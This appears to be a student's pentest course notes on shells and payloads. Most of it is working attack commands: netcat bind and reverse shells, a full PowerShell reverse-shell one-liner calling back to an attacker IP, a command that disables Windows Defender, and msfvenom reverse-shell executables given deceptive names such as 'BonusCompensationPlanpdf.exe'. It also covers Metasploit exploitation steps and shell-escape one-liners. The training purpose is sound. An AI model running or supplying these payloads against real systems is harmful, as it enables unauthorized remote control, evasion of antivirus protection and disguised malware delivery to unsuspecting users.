# Intro to shell & payloads

`What is an shell`

A `shell` is a program that provides a computer user with an interface to input instructions into the system and view text output

`What is an Payload`

`Exploitation & Security`: A payload is `code` crafted with the intent to exploit a vulnerability on a computer system. The term payload can describe various types of malware, including but not limited to ransomware.


# Anatomy of shell

```
env
```

```
$PSversiontable
```

CLI = Command langauge interpretar

# Bind Shells

With a bind shell, the `target` system has a listener started and awaits a connection from a pentester's system (attack box).

```shell-session
nc -lvnp 7777
```
`target starting the listner`


```shell-session
nc -nv 10.129.41.200 7777
```
`Attack machine trying to connect`

```shell-session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```
`Giving bash shell to the one who will connect`


# Reverse Shells


With a `reverse shell`, the attack box will have a listener running, and the target will need to initiate the connection.

payloadallthethings reverseshell cheetsheet

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.178',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
`Run this in cmd.exe to get an reerse shell`


```powershell-session
Set-MpPreference -DisableRealtimeMonitoring $true
```
`Disable AV`

```bash
sudo nc -nlvp 443
```
`443 can raise less eyebrows`

# Introduction to Payloads

In this we will examine the payloads

## One-Liners Examined

```shell-session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```
`Netcat/Bash Reverse Shell One-liner`

in the above command we are removing the /tmp/f file 
then we are creating an named pipe file /tmp/f we are cating that file

### The Full Loop in Simple Steps:

1. Attacker at `10.10.14.12` types a command, like `whoami`, and hits Enter.
    
2. `nc` on the victim machine receives `whoami` and (because of `> /tmp/f`) writes it into the pipe.
    
3. `cat` sees `whoami` in the pipe, reads it, and pipes it to `bash`.
    
4. `bash` runs the `whoami` command.
    
5. `bash` produces the output, (e.g., `root`).
    
6. This `root` output is piped to `nc`, which sends it back to the attacker.
    
7. The attacker sees `root` on their screen. The loop is complete and waits for the next command.

## PowerShell One-liner Explained


```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

# Autoamtion PAyloads & Deleviry with Metasploit


```bash
sudo msfconsole 
```

```bash
search smb
```

```bash
use 56
```

```shell-session
options
```

```shell-session
exploit
```

```shell
shell
```


# Crafting Payloads with MSFvenom


```shell-session
msfvenom -l payloads
```
`THis will display all the payloads`


## Staged vs. Stageless Payloads

What is an staged payload?
what is an Stageless Payload?


## Building A Stageless Payload

```shell-session
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

-p is used to specify the payload
LHOST is for your ip
LPORT is for port
-f specifes the format


```shell-session
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```
`Building a simple Stageless Payload for a Windows system`


# Infiltrating Windows
## Trying to find out If the Machine is Windows or Not

```shell-session
ping 192.168.86.39
```
`If the ttl(time to live) is 32 or 128 then it is Windows`

```shell-session
sudo nmap -v -O 192.168.86.39
```

```shell-session
sudo nmap -v 192.168.86.39 --script banner.nse
```

## Bats, DLLs, & MSI Files, Oh My!


#### Payload Types to Consider

- Dlls
- Batch
- vbs
- msi
- exe
- Powershell

## Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution
#### Payload GEneration

| **Resource**                      | **Description**                                                                                                                                                                                                                                                                                                   |
| --------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `MSFVenom & Metasploit-Framework` | [Source](https://github.com/rapid7/metasploit-framework) MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife. |
| `Payloads All The Things`         | [Source](https://github.com/swisskyrepo/PayloadsAllTheThings) Here, you can find many different resources and cheat sheets for payload generation and general methodology.                                                                                                                                        |
| `Mythic C2 Framework`             | [Source](https://github.com/its-a-feature/Mythic) The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.                                                                                                                    |
| `Nishang`                         | [Source](https://github.com/samratashok/nishang) Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.                                                                                                                  |
| `Darkarmour`                      | [Source](https://github.com/bats3c/darkarmour) Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.                                                                                                                                                                    |

#### PAyload transfer

- `Impacket`: [Impacket](https://github.com/SecureAuthCorp/impacket) is a toolset built in Python that provides us with a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with `psexec`, `smbclient`, `wmi`, Kerberos, and the ability to stand up an SMB server.
- [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md): is a great resource to find quick oneliners to help transfer files across hosts expediently.
- `SMB`: SMB can provide an easy to exploit route to transfer files between hosts. This can be especially useful when the victim hosts are domain joined and utilize shares to host data. We, as attackers, can use these SMB file shares along with C$ and admin$ to host and transfer our payloads and even exfiltrate data over the links.
- `Remote execution via MSF`: Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically.
- `Other Protocols`: When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host. Enumerate and pay attention to the functions that are open and available for use.



# Infiltrating Unix/Linux


## Common Considerations

- What distribution of Linux is the system running?
    
- What shell & programming languages exist on the system?
    
- What function is the system serving for the network environment it is on?
    
- What application is the system hosting?
    
- Are there any known vulnerabilities?



## Spawning a TTY Shell with Python

```shell-session
python3 -c 'import pty; pty.spawn("/bin/sh")'
```


# Spawning Interactive Shells



```shell-session
/bin/sh -i
```
`This command will execute the shell interpreter specified in the path in interactive mode`


```shell-session
perl â€”e 'exec "/bin/sh";'
```
`these commands will execute the shell interpreter specified.`
```shell-session
perl: exec "/bin/sh";
```
`THis is for scripts`


```shell-session
lua: os.execute('/bin/sh')
```


```shell-session
awk 'BEGIN {system("/bin/sh")}'
```

```shell-session
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

```shell-session
find . -exec /bin/sh \; -quit
```

```shell-session
vim -c ':!/bin/sh'
```


# Laudanum, One Webshell to Rule Them All


Laudanum is a repository of ready-made files that can be used to inject onto a victim

